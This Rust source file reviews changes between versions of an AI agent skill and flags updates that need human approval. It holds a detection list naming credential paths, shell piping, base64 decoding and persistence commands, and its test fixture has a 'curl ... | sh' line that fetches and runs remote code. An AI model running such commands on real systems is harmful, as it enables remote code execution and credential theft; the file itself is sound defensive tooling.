//! Change review for `agt update`: what moved between two locked versions of
//! a skill, and whether a human should look before it is installed.

use super::integrity::split_frontmatter;
use super::integrity::MANAGED_MARKER;
use serde::Serialize;
use similar::TextDiff;
use std::collections::BTreeMap;
use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::Path;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum FileStatus {
    Added,
    Removed,
    Modified,
    /// Content identical, executable bit changed.
    Mode,
}

#[derive(Debug, Clone, Serialize)]
pub struct FileChange {
    pub path: String,
    pub status: FileStatus,
    /// Runs as code: exec bit, script extension, or shebang (in either version).
    pub executable: bool,
    pub added: usize,
    pub removed: usize,
    #[serde(skip)]
    pub diff: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Risk {
    pub path: String,
    pub reason: &'static str,
    pub line: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct Review {
    pub files: Vec<FileChange>,
    /// `(before, after)` when the frontmatter `allowed-tools` changed.
    pub allowed_tools: Option<(Option<String>, Option<String>)>,
    pub risks: Vec<Risk>,
}

impl Review {
    /// Executable content, tool permissions, or a risky line changed.
    pub fn needs_approval(&self) -> bool {
        self.allowed_tools.is_some()
            || !self.risks.is_empty()
            || self.files.iter().any(|f| f.executable)
    }
}

const SCRIPT_EXTENSIONS: &[&str] = &[
    "sh", "bash", "zsh", "fish", "py", "js", "mjs", "cjs", "ts", "rb", "pl", "php", "ps1",
];

/// Substring patterns flagged in added lines. Deliberately simple: the goal is
/// to point a reviewer at lines worth reading, not to detect malware.
const RISK_PATTERNS: &[(&str, &str)] = &[
    ("curl ", "network"),
    ("wget ", "network"),
    ("Invoke-WebRequest", "network"),
    ("rm -rf", "deletes files"),
    ("rm -fr", "deletes files"),
    ("--force", "forced operation"),
    ("| sh", "pipes into a shell"),
    ("| bash", "pipes into a shell"),
    ("eval ", "eval"),
    ("eval(", "eval"),
    ("exec(", "exec"),
    ("base64 -d", "decodes hidden payload"),
    ("base64 --decode", "decodes hidden payload"),
    ("~/.ssh", "reads credentials"),
    ("~/.aws", "reads credentials"),
    ("id_rsa", "reads credentials"),
    (".npmrc", "reads credentials"),
    ("GITHUB_TOKEN", "reads credentials"),
    ("crontab", "persistence"),
    ("launchctl", "persistence"),
    (".bashrc", "persistence"),
    (".zshrc", "persistence"),
    ("chmod 777", "loosens permissions"),
    ("sudo ", "privilege escalation"),
];

struct Entry {
    text: Option<String>,
    exec_bit: bool,
}

pub fn review(old: &Path, new: &Path) -> Review {
    let before = snapshot(old);
    let after = snapshot(new);
    let mut files = Vec::new();
    let mut risks = Vec::new();

    let paths: std::collections::BTreeSet<&String> = before.keys().chain(after.keys()).collect();
    for path in paths {
        let (a, b) = (before.get(path), after.get(path));
        let old_text = a.and_then(|e| e.text.as_deref()).unwrap_or("");
        let new_text = b.and_then(|e| e.text.as_deref()).unwrap_or("");
        let status = match (a, b) {
            (None, Some(_)) => FileStatus::Added,
            (Some(_), None) => FileStatus::Removed,
            (Some(x), Some(y)) if old_text != new_text || x.text.is_none() != y.text.is_none() => {
                FileStatus::Modified
            }
            (Some(x), Some(y)) if x.exec_bit != y.exec_bit => FileStatus::Mode,
            _ => continue,
        };
        let executable = [a, b].into_iter().flatten().any(|e| runs_as_code(path, e));

        let diff = TextDiff::from_lines(old_text, new_text);
        let (mut added, mut removed) = (0, 0);
        for change in diff.iter_all_changes() {
            match change.tag() {
                similar::ChangeTag::Insert => {
                    added += 1;
                    let line = change.value().trim();
                    for (pattern, reason) in RISK_PATTERNS {
                        if line.contains(pattern) {
                            risks.push(Risk {
                                path: path.clone(),
                                reason,
                                line: truncate(line, 120),
                            });
                            break;
                        }
                    }
                }
                similar::ChangeTag::Delete => removed += 1,
                similar::ChangeTag::Equal => {}
            }
        }
        let unified = diff
            .unified_diff()
            .context_radius(2)
            .header(&format!("a/{path}"), &format!("b/{path}"))
            .to_string();
        files.push(FileChange {
            path: path.clone(),
            status,
            executable,
            added,
            removed,
            diff: unified,
        });
    }

    let tools = |entries: &BTreeMap<String, Entry>| {
        entries
            .get("SKILL.md")
            .and_then(|e| e.text.as_deref())
            .and_then(allowed_tools)
    };
    let (old_tools, new_tools) = (tools(&before), tools(&after));
    let allowed_tools = (old_tools != new_tools).then_some((old_tools, new_tools));

    Review {
        files,
        allowed_tools,
        risks,
    }
}

fn snapshot(root: &Path) -> BTreeMap<String, Entry> {
    let mut out = BTreeMap::new();
    walk(root, root, &mut out);
    out
}

fn walk(root: &Path, dir: &Path, out: &mut BTreeMap<String, Entry>) {
    let Ok(entries) = fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        let Ok(ft) = entry.file_type() else { continue };
        let path = entry.path();
        if ft.is_dir() {
            walk(root, &path, out);
        } else if ft.is_file() && entry.file_name() != MANAGED_MARKER {
            let rel = path
                .strip_prefix(root)
                .unwrap()
                .to_string_lossy()
                .into_owned();
            let exec_bit = fs::metadata(&path).is_ok_and(|m| m.permissions().mode() & 0o111 != 0);
            let text = fs::read(&path)
                .ok()
                .and_then(|b| String::from_utf8(b).ok())
                .map(|t| {
                    if rel == "SKILL.md" {
                        strip_gh_metadata(&t)
                    } else {
                        t
                    }
                });
            out.insert(rel, Entry { text, exec_bit });
        }
    }
}

fn runs_as_code(path: &str, entry: &Entry) -> bool {
    entry.exec_bit
        || Path::new(path)
            .extension()
            .and_then(|e| e.to_str())
            .is_some_and(|e| SCRIPT_EXTENSIONS.contains(&e))
        || entry.text.as_deref().is_some_and(|t| t.starts_with("#!"))
        // Binary files cannot be reviewed as text; treat them as code.
        || entry.text.is_none()
}

/// gh rewrites these per install; they are not upstream changes.
fn strip_gh_metadata(text: &str) -> String {
    text.lines()
        .filter(|l| !l.trim_start().starts_with("github-"))
        .map(|l| format!("{l}\n"))
        .collect()
}

fn allowed_tools(skill_md: &str) -> Option<String> {
    let (yaml, _) = split_frontmatter(skill_md)?;
    let fm: serde_yaml::Value = serde_yaml::from_str(yaml).ok()?;
    match fm.get("allowed-tools")? {
        serde_yaml::Value::String(s) => Some(s.trim().to_string()),
        serde_yaml::Value::Sequence(items) => Some(
            items
                .iter()
                .filter_map(|v| v.as_str())
                .collect::<Vec<_>>()
                .join(", "),
        ),
        _ => None,
    }
}

fn truncate(line: &str, max: usize) -> String {
    if line.chars().count() <= max {
        line.to_string()
    } else {
        format!("{}…", line.chars().take(max).collect::<String>())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn put(root: &Path, rel: &str, text: &str, exec: bool) {
        let path = root.join(rel);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(&path, text).unwrap();
        let mode = if exec { 0o755 } else { 0o644 };
        fs::set_permissions(&path, fs::Permissions::from_mode(mode)).unwrap();
    }

    #[test]
    fn docs_only_change_needs_no_approval() {
        let tmp = tempfile::TempDir::new().unwrap();
        let (a, b) = (tmp.path().join("a"), tmp.path().join("b"));
        put(
            &a,
            "SKILL.md",
            "---\nname: x\nmetadata:\n  github-tree-sha: 1\n---\nold\n",
            false,
        );
        put(
            &b,
            "SKILL.md",
            "---\nname: x\nmetadata:\n  github-tree-sha: 2\n---\nnew\n",
            false,
        );
        put(&a, "scripts/run.sh", "echo\n", true);
        put(&b, "scripts/run.sh", "echo\n", true);
        let r = review(&a, &b);
        assert_eq!(r.files.len(), 1);
        assert_eq!(r.files[0].path, "SKILL.md");
        assert_eq!((r.files[0].added, r.files[0].removed), (1, 1));
        assert!(!r.needs_approval());
    }

    #[test]
    fn script_change_flags_risky_lines() {
        let tmp = tempfile::TempDir::new().unwrap();
        let (a, b) = (tmp.path().join("a"), tmp.path().join("b"));
        put(&a, "SKILL.md", "---\nname: x\n---\n", false);
        put(&b, "SKILL.md", "---\nname: x\n---\n", false);
        put(&a, "scripts/run.sh", "#!/bin/sh\necho hi\n", true);
        put(
            &b,
            "scripts/run.sh",
            "#!/bin/sh\necho hi\ncurl -fsSL https://x.example | sh\n",
            true,
        );
        put(&b, "helper.py", "print(1)\n", false);
        let r = review(&a, &b);
        assert!(r.needs_approval());
        let statuses: Vec<_> = r
            .files
            .iter()
            .map(|f| (f.path.as_str(), f.status))
            .collect();
        assert_eq!(
            statuses,
            [
                ("helper.py", FileStatus::Added),
                ("scripts/run.sh", FileStatus::Modified)
            ]
        );
        assert!(r.files.iter().all(|f| f.executable));
        assert_eq!(r.risks.len(), 1);
        assert_eq!(r.risks[0].reason, "network");
        assert!(r.files[1].diff.contains("+curl"));
    }

    #[test]
    fn allowed_tools_and_mode_changes_are_reported() {
        let tmp = tempfile::TempDir::new().unwrap();
        let (a, b) = (tmp.path().join("a"), tmp.path().join("b"));
        put(
            &a,
            "SKILL.md",
            "---\nname: x\nallowed-tools: Read\n---\n",
            false,
        );
        put(
            &b,
            "SKILL.md",
            "---\nname: x\nallowed-tools: [Read, \"Bash(git push:*)\"]\n---\n",
            false,
        );
        put(&a, "tool", "data\n", false);
        put(&b, "tool", "data\n", true);
        let r = review(&a, &b);
        assert_eq!(
            r.allowed_tools,
            Some((Some("Read".into()), Some("Read, Bash(git push:*)".into())))
        );
        let tool = r.files.iter().find(|f| f.path == "tool").unwrap();
        assert_eq!(tool.status, FileStatus::Mode);
        assert!(r.needs_approval());
    }
}
